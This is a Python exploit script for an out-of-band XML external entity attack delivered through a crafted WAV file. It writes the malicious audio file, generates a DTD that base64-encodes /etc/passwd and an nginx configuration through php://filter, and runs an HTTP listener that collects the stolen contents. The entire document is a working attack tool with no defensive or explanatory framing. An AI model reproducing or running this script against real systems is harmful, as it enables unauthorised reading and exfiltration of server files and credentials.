#!/usr/bin/python
import base64
import sys
from http import server
from http.server import HTTPServer, BaseHTTPRequestHandler

remote_files_to_fetch = [
    "/etc/passwd",
    "/etc/nginx/sites-enabled/default",
]

SEPARATOR = "---"

class ExampleHandler(BaseHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def do_HEAD(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()

    def do_GET(self):
        self.do_HEAD()

        if self.path == "/evil_code.dtd":
            with open('evil_code.dtd', 'rb') as file: 
                self.wfile.write(file.read())
        elif self.path.startswith("/?"):
            from urllib.parse import urlparse, parse_qs
            processed_path = self.path.replace(SEPARATOR, "&")
            parsed_request_url = urlparse(processed_path)
            print(parse_qs(parsed_request_url.query))
            print("-------------------------")
            print(self.path)

        

if len(sys.argv) == 4:
    ip_address = sys.argv[1]
    port = sys.argv[2]
    output_file = sys.argv[3]

    
    media_payload = f"RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version=\"1.0\"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://{ip_address}:{port}/evil_code.dtd'>%remote;%init;%trick;%init1;%trick1]>\x00"    
    with open(output_file, 'w', encoding="latin-1") as media_payload_file:
        media_payload_file.write(media_payload)

    payload1 = ""
    payload2 = f"""
    <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://{ip_address}:{port}/?"""

    for remote_file in remote_files_to_fetch:
        normalized_remote_file = remote_file.replace("/", "_")
        payload1 += f"""
        <!ENTITY % {normalized_remote_file} SYSTEM "php://filter/read=convert.base64-encode/resource={remote_file}">"""
        payload2 += f"""{normalized_remote_file}=%{normalized_remote_file};{SEPARATOR}"""

    payload2 += """'>" >"""
        
    print(payload1, payload2)
    with open("evil_code.dtd", "w") as dtd_file:
        dtd_file.write(payload1+payload2)

    server = HTTPServer(('', int(port)), ExampleHandler)
    print ('Starting server, use <Ctrl-C> to stop')
    server.serve_forever()

else:
    print(f"Usage: ./{sys.argv[0]} ip_address port output_file")
